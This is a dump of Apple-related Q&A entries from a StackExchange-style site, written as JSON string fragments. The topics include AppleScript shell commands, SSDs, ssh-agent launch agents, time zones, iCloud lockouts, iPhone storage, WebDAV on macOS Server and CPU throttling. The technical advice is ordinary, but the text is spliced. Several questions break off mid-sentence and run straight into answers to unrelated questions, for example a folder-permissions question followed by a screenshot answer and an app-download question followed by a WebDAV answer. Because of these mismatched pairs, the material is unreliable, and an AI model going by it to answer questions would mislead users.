is available on your computer. An alternative is mpg123 which can be installed in mac by means of brew. My question is how I can use this command in an apple script.\n\nA: Command line programs can be run using the do shell script \"...\" command in AppleScript.  You can generally write a command as you would in Terminal, keeping in mind that double quotes need to be escaped with a preceding backslash \\.  The do shell script command returns the last output to stdout.\nSo, for example:\ndo shell script \"myvar=hello world; echo \\\"$myvar\\\"\"\n\nwill return hello world as a string.\nThese commands are run without a terminal, so can't interact with the user, e.g. to receive user input.  If you need a terminal, you can tell application \"Terminal\" to tell the front window to tell the front tab to do script \"...\".\nBut, do shell script \"...\" is perfect for most situations where bash commands need to be employed.\nIf it's useful to know, iTunes can also play audio streams from the internet.  You can do this from the command line like this:\nopen -a itunes \"http://ssl.gstatic.com/dictionary/static/sounds/20160317/pronunciation--_us_1.mp3\"\n\nFrom within AppleScript, this might look like:\ndo shell script \"open -a itunes \\\"http://ssl.gstatic.com/dictionary/static/sounds/20160317/pronunciation--_us_1.mp3\\\"\"\n\nor, using iTunes scriptability:\ntell application \"iTunes\" to open location \"http://ssl.gstatic.com/dictionary/static/sounds/20160317/pronunciation--_us_1.mp3\"\n\n", "Q: I created free space and I don't know to recover it So I followed this answer here\nMerge partitions with Macintosh HD\nAnd I ended formatting my old bootcamp partition into free space.\nBut now I am unable to see the free space anywhere.

I see where someone recommended an SSD to help speed up a Mac mini but I do not know what an SSD is.\nWhat's an SSD and what does it do?\n\nA: SSD short for Solid State Drive is a recent evolution in hard drive technology. SSD's have many advantages over a conventional platter-based hard disk:\n\n\n*\n\n*Improved read and write speeds: A typical SSD is multiple factors of times faster than a magnetic hard disk. This results in a much higher read and write speeds leading to faster overall user experience.\n\n*Much lesser chances of failure: There are close to no moving parts in SSD. SSDs is basically just an integrated circuit. This greatly reduces any chance of failure due to movement while in operation (common in traditional hard drive).\n\n*Unaffected by magnetic field interferences: SSDs are generally not susceptible to failure (compared to traditional platter-based drives) due to exposure to magnetic fields as there are no magnetic parts present. The core technology doesn't use magnetic state to store data.\n\n*Silent operation: SSDs are also dead silent while in operation.\n\n*Consume less power: Due to the absence of moving parts, SSDs consume much less power. Helpful when you are using a portable computer on battery power.\nSince a hard drive's read/write speed is generally a major bottleneck in the overall performance of a computer system, it is recommended to upgrade to an SSD (if your computer supports it) to improve performance.\nMac minis were conventionally shipped without an SSD, so many recommend to replace the internal drive with a compatible SSD to see improved performance, especially when using data-intensive applications. Faster read-write also speeds up paging performance, thereby improving system responsiveness.\nThe current generation of Mac mini can be configured with an SSD while placing an order.\n", "Q: Can't remove unknown symbol from menu bar I have this symbol in my menu bar, I don't know where it came from.

Otherwise, add the line 0 anywhere between the  tags.\n\n*Close and save the AdobeUpdaterPrefs.dat file.\n\n\nSteps copied verbatim from Adobe Support\n\nA: The general  solution to this problem is to review each and every item that starts up when you log into your Mac. That involves looking in several locations so I use a tool that is free to try like BarTender to identify and manage the menu bar. \n\n\n*\n\n*https://www.macbartender.com/\nYou do need to pay for it if you keep using it. That icon looks like Adobe, but who knows what you installed and who may have copied an Adobe icon if you have malware or just things you didn’t realize were modifying your system installed. \nNow the spinning wheel gives you another free tool tool - start Activity Monitor and then see which apps or processes are not responding.

What specific features are missing from this devices restricting me from installing the app?\n\nA: This keep happening with some users over the time. Most likely some issues at the Apple's servers end.\nIn case this issue is reported when you are fully confident that your device has the capability to run the said app, the most likely explanation is a temporary glitch from Apple's end.\nThe recommended approach here is to wait for some time and try again.\nThe iCloud Drive app in iOS 11 and later is superseded  by a new app called Files by Apple.\nFiles app support connecting to multiple storage sources with iCloud Drive connected by default.\niCloud Drive app is still available on the App Store for older devices running iOS 10.

The \"Use audio port for:\" was selected to \"Sound Input\" - in the system preferences. I had to plug in my headphones and then change it to \"Sound Output\" (it wouldn't let me make that change unless I had something plugged into the audio port). I started playing some music on my computer and confirmed that it was now sending the audio through the headphones. While the music was still playing I unplugged the headphones and the audio switched to my internal speakers. From then on it worked correctly when the headphones were not plugged in and would switch to the headphones when they were plugged in. \nSide note: I often change the Input/Output of my audio port for recording purposes.

Everything was backed up with Crashplan online so I restored my data using their instructions but instead of overwriting my new user folder, it just put the restored user folder inside of the new user folder.\nAfter everything downloaded from their server, I moved all my documents and pictures to the proper folders but I am not sure what I should do about the library folder.  I am thinking I should try to restore just the Library folder and direct the software to overwrite any duplicate files.  \nIs there any harm in just leaving the second library folder where it is?\nEdit:  I should also note that some of my installed applications were not reinstalled with the restore \n but I'm not too worried about those because there weren't that many to begin with and I plan to just reinstall them.\n\nA: I like to make an admin user - new short name and then restore the files from CrashPlan to /Users before I create the Mac log in account. That way, you fix any permissions and user ID conflicts.\nWhen you make a new account with a specific short name and the folder with that short name exists - macOS will then ask you if you want to reuse that folder and it proceeds to use / fix / upgrade any settings you have restored and then makes the new user active.\nThe harm in leaving the new folder in the wrong place is you don't get the files and settings used and your system will make up new settings and files in the proper location as you launch each app.\nCode42 support for CrashPlan is also very good if you get stuck with restoring things and you want some individual help or have back and forth type questions that don't work well here.\n", "Q: How to stop ssh-agent from being started on login/boot I noticed ssh-agent is started automatically upon login. I'd rather it not do this, as I'd prefer oh-my-zsh to start the ssh-agent instead (since it automatically adds my id_rsa which is a nice feature).\nI've tried tracking down where this is getting started, but I don't see anything. How do I disable it?\n\nA: The launch daemon (launchd) is responsible for starting processes at boot, on demand, on schedule, in response to incoming network port connections and when a user is logged in.\nYou may get lucky with grep:\nlaunchctl list | grep ssh-agent\n\nIn this case, it's the openssh prefernence that starts things:\nlaunchctl list com.openssh.ssh-agent\n\nI seriously prefer to edit these preference files with a tool like LaunchControl or Lingon. They give contextual help, graphical affordances and syntax checking. Apple's launchd/launchctl documentation exists but is dense, descriptive (rather than narrative / educational / prescriptive or basically easy to learn and use).\nHere's an example how it shows an error with this specific agent on my Mac and a helpful warning that I need to disable SIP before futzing with this specific job or agent.\n\nIf you want to unload / disable this you need to find where the preference is stored then edit it or tell launchctl to unload (permanently) that item:\nmdfind ssh-agent|grep plist\nlaunchctl unload -w /System/Library/LaunchAgents/com.openssh.ssh-agent.plist\nsudo launchctl disable system/com.openssh.ssh-agent\n\nThe daemons like this system one are being transitioned from the old \"unload\" syntax to the new \"enable|disable\" syntax, so you might get different results from my above commands on different versions and builds of macOS. Since you can see when it's running and kill it manually (killall ssh-agent) you should have good success with this extra info on launch daemon that's not on most articles for unix management of this ssh tool.\n", "Q: Make apps smaller / \"zoom out\" apps I made my screen resolution much smaller, so now most apps look 4x larger than I'm used to.\niTunes and Finder for example are much larger than they need to be.\nCan I make everything about these apps smaller?\nThe text, the window sizes, the icon sizes etc.\nMacbook Pro w/ Retina display, mid-2015 15\".\nI used RDM to make my screen to 720p.

My MacBook Pro is not working anymore, I have some valuable data that I want to retrieve right now. \nThis question is only software related. I can handle all the hardware stuff. \nI know that the formats are different so I wanna make sure this will work.\nThank you. \n\nA: There are a number of variables we need to answer before we can answer the question around what kind of drive it is, and what format the drive was in.\nIf you can provide some more information I can tailor the answer to you a bit more:\n\n\n*\n\n*What model of MacBook Pro is it (which year and specification)\n\n*What version operating system was the Mac running?\n\n*What actually happened to the Mac to stop it working?\n\n\n\nIn the mean time this will give you some idea of what to do:\nDrive type\nThe type of drive your MacBook Pro will dictate how you connect the old MacBook Pro drive to your PC.\nSoldered SSD\nFirst consideration is that more modern MacBook Pros' drives are soldered onto the logic board of the computer and cannot be easily removed, only Apple or an Apple Authorised Service Provider can retrieve this data.\nThis applies to MacBook Pro 2017 and 2018.\nPCI Express SSD\nThis type of SSD is a removable stick, this can be removed easily using a take apart guide from iFixIt.com but would require a computer that supports this kind of SSD or a suitable adapter to read the data.\nThis applies to MacBook Pro models from 2013 to 2016.\nSATA / IDE SSD or spinning drives\nThese are by far the easiest type of drive to remove and recover data from as they can be easily removed by following a take apart guide from iFixIt.com for your model, and the drive can then be connected to an appropriate USB to SATA or IDE adapter available readily on eBay or Amazon.\nThis applies to all models of MacBook Pro prior to 2013.\nDrive format\nAfter you've got the drive out the next question is whether it was running APFS or HFS+ file systems. if the drive is not a SSD i.e. it is a spinning disk it is most likely running HFS+.\nHFS+\nThere are a number of applications available for Windows that can read HFS+ formatted drives, although I have no personal experience with using any of these this article suggests 4 options: https://www.makeuseof.com/tag/4-ways-read-mac-formatted-drive-windows/\nAPFS\nIf the computer is running APFS the options are more limited, there is some new software from Paragon which also now supports APFS apparently.\nAlternatives\nIf you don't fancy using any Windows software to do this, or don't want to pay you could look at borrowing a friends Mac which would natively be able to read both HFS+ and APFS drives if it is running macOS High Sierra.\nThis would allow you to copy the files onto another hard drive running ExFAT or FAT32 file systems which work on both macOS and Windows.\n", "Q: Is there a way to force photoanalysisd to work harder than it does by default? I migrated my rather large Photos library from El Capitan to High Sierra probably around 2-3 months ago. To this day, the Photos app still reports that it hasn't completed its analysis of all the faces.\nI am aware that leaving the Photos.app open will pause its analysis so I have left it closed most of the time. As well, I have tracked the CPU time that the process is consuming so I do know that it is doing something.\nIs there a way to kick the process into a more aggressive mode? I mean, why does it have to do everything so tenderly in background mode? It is almost like it is trying not to use my disk or CPU at all and quite frankly I've got a desktop with 8 cores, plenty of RAM and such and I wouldn't mind if it burned my CPU for 2-3 days to just get it all done.\nTo clarify: this is not a matter of a low priority or lack of CPU/RAM as the machine has plenty to spare and is left alone most of the time not doing anything. It is a question of if there is a config/setting that can tell the process to work hard on the problem rather than VERY passively?\nAny ideas?\n\nA: I had the same problem when I migrated all my photo library and here's the way I've found to make Photos analyze my gallery faster:\n\n\n*\n\n*Open Photos.app preferences\n\n*Open the iCloud tab > click on Download Originals to this Mac\n\n*Wait for all the photos to download\n\n\n\nThe scan should be faster after this, it should scan ~50 000 pictures per day. Unfortunately, if you don't use iCloud or the \"Download Originals\" option was already clicked I don't think there's any other way to make it go faster.\n\nA: I just found an interesting issue that photoanalysisd was not making progress on my photo library.  First I learned for its message that if the library is in use it will not run. An item that I hadn't thought about was that my screensaver was using my photo library.  Also, I still had the old photo stream feature enabled.\nAfter all uses of my photo library being active other than cloud library download, I looked at console log.  With the console streaming messages active and searching for photoanalysisd in any.  I discovered a message related to photoalaysisd from another background process:\n\n{name: ThermalPolicy, policyWeight: 5.000, response: {Decision: Absolutely Must Not Proceed, Score: 0.00, Rationale: [{thermalLevel > 0}]}}\n\nI keep my office at about 25 C.  This meant that my CPU run warmer than it was allowed.  I am testing with a cooler office and hope it will resolve the issue.\nTL;DR: Shut off all uses of your photo library and monitor the console log to see why it might not be allowed to run.\n", "Q: change /etc/localtime to UTC time? I noticed it is common for programming languages to utilize /etc/localtime when determining the current time to display for a user. In particular, I know that Ruby relies on /etc/localtime if the \"TZ\" environment variable is not set. I am able to read the contents of this binary like so:\n$ zdump /etc/localtime\n/etc/localtime  Sun Aug 12 16:53:50 2018 EDT\n\nIt seems, therefore, the time used by programming languages is Eastern Time North America. It makes sense, I am in the East Coast of the US. However, how can I change this file to UTC so that the programming language and software on my computer uses UTC rather than EDT time?\n\nA: You can set the time in System Preferences, and that time should be reflected back in /etc/localtime.\nIf you want to do it at the command line, use the systemsetup tool (which has to be run via sudo, fyi).\nHere are the relevant commands from sudo systemsetup -help:\nUsage: systemsetup -gettimezone\n    Display current time zone.\n\nUsage: systemsetup -settimezone <timezone>\n    Set current time zone to <timezone>. Use \"-listtimezones\" to list time zones.\n\nUsage: systemsetup -listtimezones\n    List time zones supported by this machine.\n\n", "Q: How to disable Password Prompt for select apps How can I disable administrator password requirement for select apps, for example the app \"Mac DaddyX\" will not require a password to be entered to operate the desired function (in my case... changing MAC address).\nJust to note that the password prompt is popping up because of macOS and NOT the app itself.\n\nA: It is not possible to bypass the requirement for administrator password unless the application in question supports remembering the password.\nThis is because the password is required in order to achieve what you are trying to do and macOS doesn't support bypassing security. Potentially it would be possible to run the application as the root (administrator) user and this might help, but this isn't advisable, and it seems likely that the app would still require your password.\nYou could do this by running the application from Terminal and prefixing the command with sudo.\n", "Q: How insert “+” from MacBook italian keyboard? I have just bought a Macbook pro and I have to program. But I can not figure out how to insert this symbol \"+\". On the net I could not find anything.\n\nA: If you actually can't find the key \"+\" by System Preferences > Keyboard > [X] Show keyboard in menu and testing all modifier keys with Apple's keyboard overview app, you might use Terminal.\nOpen and type xmodmap -pk.\nThis will give you a list of key names & values. Copy contents to BBEdit/TextEdit, search for \"plus\".\nIf it's in a first place the key must be accessible directly.\nSecond place will be combined with shift, third place with option, fourth with shift & option.\nSo: look for the line containing \"plus\", somewhere, and note down the first key's name.\nThat's your key \"+\" – to be pressed with or without modifier(s).\n\nA: If for some reason, you are pressing the key which has + printed on it, but you are getting something else, go to system preferences/keyboard/input sources and make sure that there is only one item on the list, and that it is called \"Italian\" (and not \"Italian Typewriter\").\n", "Q: Weird Password/iCloud stuff going on - baffled. \"This is impossible.\" I've had some weird stuff going on in the last few days.\n\n\n*\n\n*On Wednesday, I was listening to a Podcast on my iPhone. This one is rated \"E\" for explicit. I was about 5 minutes from the end, when I stopped, planning on finishing the show later. When I returned the next day, the iPhone displayed \"Episode Contains Explicit Content - To play this episode, allow explicit content in Restrictions.\" ?!?! I have no children in the home. No one else ever uses my iPhone. I didn't turn on Restrictions between Wednesday and Thursday. I didn't do an update. I didn't reset. I didn't backup or restore. Nothing changed, and yet.....\n\n*Tonight, I noticed that my Apple Watch didn't unlock my Mac. So, I opened the Security & Privacy section of System Preferences. The \"Allow your Apple Watch to unlock your Mac\" was unchecked, even though I have been using it for months. It was still working even after recently (one week?) changing Apple Watches. But, now, unchecked. WTF?\n\n*When I tried to check the \"Allow Apple Watch to Unlock My Mac\" option, I was prompted to \"finish setting up iCloud....\" I clicked \"iCloud\" which asked for my password. I haven't changed my password in months or years. I regularly use it and type it in manually. I visit appleid.apple.com or iCloud.com regularly, and type my password all the time. And, I have a mind for numbers and passwords. I don't forget passwords. Ever. And all my devices use iCloud Keychain....But, tonight, my password didn't work. I typed it in very carefully, several times. I typed it where I could see it, copied and pasted - fail. I visited iCloud.com and appleid.apple.com - both failed. I finally had to change my password. But, WTF?\nHas this happened to anyone else? Recently or ever? Does anyone have a rational explanation as to why this could be happening? I sure don't. I'm not a novice with Apple, iCloud, iPhone, or computers in general, but damn if I'm baffled by this one. And a little worried/paranoid that it might be nefarious.\n\nA: This might just be a simple service outage or a migration to move iCloud data to a new container or migrate it to make it ready for the fall iOS and macOS releases and new features that ran into a glitch.\nThe same way thing has happened to me recently. Yesterday I had stuff in my iPhone analytics dating back to July,8th. I went to show them to a coworker today and 80% of them were gone. I don’t have any idea how, that coupled with some other stuff has me worried that’s it’s nefarious.  \nI also feel as though somebody has reported me to the police and that I am now listed as an aggressive or dangerous person.

I don't really remember the password, since I use Touch ID almost exclusively. I wanted to enter the password on my computer, and could not get the password right, thus now I am locked out for 8 hours at a time.\nI do not have my recovery key. Two-factor authentication is active.\nSo now I'm reduced to trying one possible password every 8 hours. I try once, get rejected, get put on an 8 hour freeze.\nIs there any way to get out of this cycle? If I wait 48 hours (or something else), will I get a fresh crack at trying multiple passwords?\n\nA: If you are being directed to enter a recovery key, your Apple ID uses Two-Step authentication, and not Two-Factor which doesn't require a recovery key.  \nIf you lose your recovery key, you can create another one if you have a trusted device that is already signed into the account.  Without access to another trusted device, and without knowing your recovery key, you will be unable to sign in and generate a replacement key. See the FAQs at https://support.apple.com/en-us/HT204152.\nIf you use your Apple ID to log into your computer (as it sounds like the OP does), in some cases you can remove the link between the local macOS account and the Apple ID so that you can sign into the Mac and regain access to all of your data.  If you have a second Admin account, or if you are able to force the system to create a new one, then you will be able to manipulate your account to disconnect from Apple ID, and potentially create a new one, however your access to the existing Apple ID is lost if you can't provide the recovery key, and any data associated with the account will also remain unavailable.  This is a particular problem if you have been using iCloud Drive to store your Desktop and Documents.\nIn this case, you will be better off contacting your local AppleCare support line to assist you to regain access to your system, as they are likely to have either tools or process which can assist you in this case.\n\nA: For your specific case, where you are using Two-Factor authentication and do not have access to the recovery keys, the instructions for resetting password are documented in the Apple support document, Recover your Apple ID when you can’t reset your password.\n", "Q: Find all folders with rwx permissions for a certain user?

Skitch app Menu Snapshot option gives the same result.\nBTW I've used to use the Comm-sh-4 crosshair capture but just at the very moment you lift the cursor to complete the drag, something causes the cursor to select the next menu item, so you capture the menu item without it being highlighted. \n\nA: The screenshot isn't monochrome, but rather the highlight of the menu isn't ‘composited’ correctly in the screenshot. If you screenshot a menu with other colour in it (for example, System Preferences View menu), you'll notice those colours remain and just the highlight changes from blue to grey.\nThis bug has been around in macOS for as long as I can remember, and has been fixed in the developer preview of macOS 10.14 Mojave to be released later this year.\n", "Q: Reinitialize third party keyboard Is there any way to reinitialize an external third party USB keyboard?

I know there is another question exactly like this, but from what I can tell it doesn’t seem relevant to iOS 11 (which is what I’m on).\n\nA: Either offload apps, or just delete unused apps. \"Other\" is the internal storage from apps, so offloading apps technically removes them. \nUnless you just want to free up space, then do that or delete photos. A lot of videos and pictures takes up lots of storage.\n\nA: Other is basically App Data. To free this space you can Offload an app.\nOffloading an app\nGo to Settings -> General -> iPhone Storage -> Tao on any app -> Offload app:\n\nThis frees up any storage by the app but keeps your documents and data if you re-download it. \nStorage suggestions\nIf you are on a compatible iOS version when you go into iPhone Storage there should be Storage suggestions like offloading apps or uploading to iCloud:\n\nUploading to iCloud\nIf you have enough space in iCloud you can upload your documents and photos onto it so it doesn’t take space on your phone.\nIf you go to Settings -> [your name] -> iCloud you can select what to upload to iCloud. Photos takes up quite a bit of space so you can upload photos to iCloud.\nAdditional space can be purchased at a monthly rate.\nExporting photos or documents to your computer \nIf you have a Mac or other computer you can connect your phone and export some photos and videos that you don’t look at a lot or documents you don’t use a lot. Bare in mind though if you need them you won’t have them j less you have your computer so iCloud is better.\nClearing up photos\nYou can manually clear up your photos. There are some apps and tools for your computer that will check for duplicate photos. \nHere is a duplicate checker for iOS. I haven’t tried it but it seems to have good reviews. \n\nA: Other is storage from apps and the operating system, including temporary files. If you have apps that store data on the phone you can delete the app and remove their data if you no longer need them. \nAlso you can back up your device, wipe it and restore using the last backup and that will often clear some of the files in Other. \n", "Q: Is it possible to download an older version of an app if you purchased a newer one on a different phone using the same Apple ID?

After having upgraded to High Sierra with Server 5.6.1 I want to recreate the WebDAV shares I had. I've used wfsctl to create a share point. The share point has ACL for a specific user. So far so good and wfsctl lists the share, but since Server.app is configuring Apache (a web site is running too) something must be done to make it work. \"The Apache http instance for WFS should be configured to run behind macOS Server's proxy.\" wfsctl diagnose says \"Config is valid\", btw.\nWhat do I need to do to make this work?\n\nA: And ... I found the solution (so far).\nThe issue was that I did not use Wiki Server before on macOS Sierra + Server. Wiki Server was turned off. However, to enable WebDAV sharing on macOS High Sierra + Server, you need to activate Wiki Server in Server.app and turn WebDAV sharing on.\nThe tip was found on Tod Olthoff's blog: http://www.toddolthoff.com/blog_files/c6e4e39502d35b674693ad80ac2ca042-445.html\nSo, the only thing I had to do to get my wfsctl managed WebDAV shares running again was to turn Wiki Server on and WebDAV sharing on in Wiki Server.\n", "Q: Symlink dotfiles to Documents/Dotfiles I have a setup script which creates links between my dotfiles repo and the files at the root of my Home directory. Generally speaking, the process looks like this for each file:\nln -s ~/Documents/Dotfiles/.bash_profile ~/.bash_profile\n\nIs this linked in the correct direction? E.g, I want to be able to keep my customizations in Documents and just point to them. Most of the documentation I've read seems to assume a traditional Unix or Linux environment, so I'm not sure this is correct.\nThe relevant part of my setup script is below\n#!/bin/bash\n\nset -e\n\nfunction makeLinks() {\n  ln -s ~/Documents/Dotfiles/.bash_aliases ~/.bash_aliases\n  ln -s ~/Documents/Dotfiles/.bash_profile ~/.bash_profile\n  ln -s ~/Documents/Dotfiles/.bash_prompt ~/.bash_prompt\n  ln -s ~/Documents/Dotfiles/.gitconfig ~/.gitconfig\n  ln -s ~/Documents/Dotfiles/.gitignore_global ~/.gitignore_global\n\n  read -rp \"This may overwrite existing files. Are you sure? (y/n) \" -n 1;\n  echo \"\";\n  if [[ $REPLY =~ ^[Yy]$ ]]; then\n    makeLinks\n  fi;\n}\n\n\nA: man ln clearly says:\nln [-Ffhinsv] source_file [target_file]\n\nSo yeah, your command seems reasonable.\nThe script, however, is odd. makeLinks is never invoked and the prompt asking for confirmation would just cause recursion.

If there is no default handler, OR you wish to open with a different app, use the -a option, and spec the handler/app you want to use. And read man open... or just type open on the command line by itself.\n", "Q: If setting a system language in iOS doesn't take effect for apps already installed. What else can be done? Perhaps, changing the base system's language isn't the way to getting all the apps' language changed the same way.\nThe case is, an iPad set from factory to Chinese language. In accordance, all apps, including system as user's ones, are set to Chinese.\nDespite Apple world's cultural concept that each device belongs exclusively on one person, the iPad was given away. \nThe new owner is a Spanish speaker who doesn't know a little of Chinese.\nChanging the system language to Spanish didn't work out most of the apps retaining Chinese. The language change is only effective to the menues and widgets of iOS itself.\nWhile a clean reinstall does the job for most of apps, the problem stems from the system graded apps, those that being still in Chinese, don't admit a workarround like that, as they cannot be uninstalled.\nSo, whats the correct (or incorrect) way to go to achieve a language change this complete as though the full system were set Spanish from factory?\n\nA: All apps provided by Apple should automatically change language to whatever the OS is set to.  If they do not, you should try Restart or Force Restart.\nThese is no further os change you can make, so if Applications you loaded don’t respect the system language, the solution is removing them or contacting their authors for a bug fix or app specific support. \n", "Q: CPU speed of the Macbook Pro Retina downclocked I've a MacBook Pro 15\" late 2013. For a long time I have encoded videos with handbrake and the CPU was very hot for hours. The clock speed was about 2.8GHz (I have the 2.3GHz model) and the temperature was over 95°C. In one of the last updates of High Sierra I think there was some modification such that now the CPU speed while encoding a video is about 1.8GHz and the temperature is always lower than 80°C. What can I do? I've lost about the 35% of the power of my mac....\n\nA: MacBooks do indeed tend to have some issues with their thermals. What I'd try to do in your case would be downloading an App to control your fan speed like Macs fan control. It's free, you don't have to buy the paid (donate) version. You can set your fans to spin up higher than the stock values Apple implements. \nJust for testing, you could set the fan to 100% at a CPU temperature of over 70°C and see if it does make a difference in performance.\nI also do have a MacBook that's 5 years old now and while I don't do rendering or video conversion like you do on it, I had very high temps aswell just compiling code or browsing some heavy webpages with loads of JS. What I did was open up the laptop and replace the thermal paste. The stock paste that was applied was very badly (see this example from a MacBook Pro 2015). Sadly this seems to be fairly common and while these CPUs do sustain temperatures under 100°C pretty well, the OS often throttles it instead of running the fans on maximum.\nUsing TG Pro (just a personal preference, the tool linked above does the same thing) and reapplying my thermal paste I went from 60°C in idle to around 38°C and from 90-95°C to 80-85°C under heavy load.\nThat being said, the computer does get pretty noisy on maximum fan speed and reapplying thermal paste is not something everyone should just try. But the former should be worth a try.\n", "Q: Automatic capitalization when typing terminal commands Recently when I use the terminal and I type a command, I hear a click and whatever I had typed becomes capitalized. If I'm typing ls -lrt I'll hear a loud click and when I look at my command it has changed to Ls -lrt. The same with pwd or any command I type. The capital letter will work on some commands but not all. Does anyone know how to turn this off? I went to System Preferences/keyboard/text but the selection there to use automatic capitalization is not checked. I may have inadvertently done this with Better Touch Tool but I can't find anything about it in the app. Any help would be greatly appreciated.\n\nA: Well I found the solution with help from @Allen. I tried restarting my computer in Safe Mode. The problem with capitalization went away. Based on this result it was probably due to something I loaded onto my machine. While I was in Safe Mode I started by looking at the Startup items found in the System Preferences/User and Groups. I hadn't carefully checked the Login Items in quite a while and I found out I had many. Some of these were suspicious in that the kind of item was unknown. I show this in the images below:\n\n\nI had several that fit that description. Using the minus symbol shown in the bottom left of the window I deleted the suspicious login items and rebooted my computer back to regular user mode. To my joy the auto capitalization was gone. I deduce it must have been connected to one of the login items I removed. Had I removed them one-at-a-time I might have beem able to determine which one was the culpit. As it is I can only narrow it down to the ones I removed. None of these were new additions so I must have changed settings in one of these to suddenly cause my troubles. Due either to old age or the fact that auto capitalization was driving me crazy, I can't recall what changes were made recently. I may go back and try to determine which specific one was causing this but that is left for a future date. \n", "Q: How to use Mac microphone for a phone call on iPhone My iPhone is plugged into my Mac. I have a nice USB mic on the Mac I'd like to use for calls. I'm used to using Rogue Amoeba's software (e.g. Airfoil) so I know it's possible to pipe the audio around. How do I use the Mac's USB mic for my iPhone?\n\nA: You should be able to use the FaceTime app on your Mac to place calls via your iPhone.\nTo set this up it should be as simple as signing into the same Wi-Fi on both devices (Mac & iPhone) and the same FaceTime account on both devices.\nFrom here you can make calls by just typing the number into this box in FaceTime:\n\nAs for using the microphone, you can configure which devices to use for speaker, microphone and webcam in the \"Video\" menu...\n\nFinally once you've linked this all up inbound calls should show up as a notification you can answer on the Mac. If you prefer to answer on iPhone you can do this and then on the iPhone call app you can click the \"Audio\" option to route the call to your Mac where the FaceTime app will take over...\n\nEDIT: Evidence that FaceTime can make calls from the Mac via an iPhone:\n\n", "Q: Can I ask Siri to connect an Apple TV to my AirPods? What is the correct command to get a 4th Generation Apple TV to connect to AirPods using Siri? When I try “connect to my AirPods”, all that happens is the Settings app opens and “Video and Audio” is selected. The AirPods are already paired to the Apple TV.\n\nA: There is no way to use Siri to connect your AirPods to your Apple TV: not listed on Apple’s “Use Siri on your Apple TV” article.\nThe fastest ways I’ve found are to swipe down from the top and select them in audio settings (for apps that support it) or hold the Play/Pause button when in the “menu”/“TV” view, to see your Bluetooth output options.\n", "Q: Late 2013 Macbook Pro turns off at random times I have a late 2013 15' MacBook Pro I've had since it was new. \nStarting about two weeks ago it randomly shut down without any notice.

The screen goes black and when I turn it back on there are zero notifications about it shutting down improperly or having a critical issue. It happens while using an external HDMI display or not, power adapter plugged in and not. \nI have tried:\n\n\n*\n\n*SMC reset \n\n*PRAM Reset\n\n*Diagnostic mode boot up\n\n\nI recently tried booting up to Windows 10 through boot camp and it hasn't powered off once, which is odd.\nI've read around the net and a number of posts on this site, I don't see any solid solutions yet and I haven't brought it into Apple or an authorized repair center.\n\nA: try booting into safe mode and test out the machine and see if it powers off. To boot into safe mode, hold down the Shift key when you power it on. Test it and see if it happens again. If not, it could be a third-party application or extension.\n\nA: Have you updated to macOS Mojave? I had this same issue on my 2012 15\" MacBook Pro and nothing  I tried fixed it but since I installed Mojave it hasn't happened anymore. Maybe Apple knew about it and the only way to fix it was in the operating system. I didn't actually try taking it to an Apple store though, so maybe there was a different fix for it.\n\nA: My suggestion is to take it to an Apple Store or Apple Authorised Service Provider as soon as possible because the machine is borderline vintage and when Apple announces that it is vintage then it will no longer be serviceable at all by any Apple service provider.\nAlthough you've run AHT (Apple Hardware Test) there is also ASD (Apple Support Diagnostics) which are much more in-depth. Running this is something Apple service provider can do easily and may provide more information.\nSomething you'll also find they'll do at an Apple service provider, especially at an Apple Store is boot the computer from a KG (Known Good) hard drive with macOS installed. Which can be left to run for a period of time to preclude any operating system issues with a simulated load.\nYou could do this yourself if you'd prefer to first, by installing macOS onto an external hard drive or USB stick (I can give instructions if needed for this, just ask). If you don't have a spare drive where you could do this you could instead take a backup of your data and reinstalling the operating system, if this doesn't resolve the issue it only leaves a hardware issue.\nOne final though, have you noticed if this issue happens while on battery only, or also when on power adapter, if the former (battery only) it could be that the battery is failing and unable to sustain peak power, and a replacement battery could resolve the issue. However this issue will normally show up in the System Information app which you can access by:\n\n\n*\n\n*Open the Apple menu\n\n*Hold Alt and click System Information\n\n*Navigate to power on the left side\n\n*Look for the section \"Health Information\"\n\n*Check the cycle count is less than 1000\n\n*Check the \"condition\" says \"normal\"\n\n", "Q: I want my Mac running Sierra, to stop hiding dock when I enter \"Command+Option+D\" I want my Mac (running macOS Sierra), to stop hiding Dock when I enter Command  + Option + D.\nI need to use that key command for InDesign.\n\nA: You can edit the keyboard shortcut by going to System Preferences app → Keyboard → Shortcuts → Launchpad & Dock and assign a different non-conflicting shortcut for toggling Dock display.\n\nA: Go to System Preferences/Keyboard, From there select the Shortcut tab at top of window. The 1st option on the left is LaunchPad and Dock.

I switched my iPhone 8 into airplane mode, but it continued periodically transmitting on 1.8 GHz, as measured by an electrosmog meter. Why? Isn't airplane mode supposed to turn off the radio transmitters? Or is airplane mode on an iPhone only a low-power mode?\nAfter enabling airplane mode, I powered the phone off and booted it in a Faraday cage. It still transmitted on 1.8 GHz, despite not being able to receive any cell tower signals. \n\nA: The issue might be related to the \"persistent settings to Airplane Mode\" since iOS 11. This means that I can go into airplane mode and enable Bluetooth or WiFi and Bluetooth or WiFi will remain on whenever I'm in airplane mode:\n\nHowever, this does not explain why the 1.8 GHz cellular transmitter still transmitted in airplane mode.\nI reset network settings and rebooted the phone a few times, now it isn't having this issue.\n", "Q: Disable iPhone 1.8 GHz radio transmitter? Is it possible to turn off the 1.8 GHz transmitter on an iPhone via software?\nI would like to use WiFi calling only.\n\nA: No. Apple doesn’t allow control over specific radio frequencies. You could jailbreak and try installing / modifying the baseband software or avail yourself of the normal controls to turn on or off WiFi, cellular data, airplane mode and Bluetooth. Note, turning many of these off doesn’t disable the radio, but disassociates them from the active connections. Based on what you intend to do, that might suffice. \nKeep in mind, you don’t need a SIM or even a registered phone to dial 911 (in the USA and other emergency numbers globally) so the radios stay running independent of the cellular data and service working.\n", "Q: iPhone won't stop connecting to bluetooth, interferes with mouse My iPhone keeps pairing itself to my Mac.

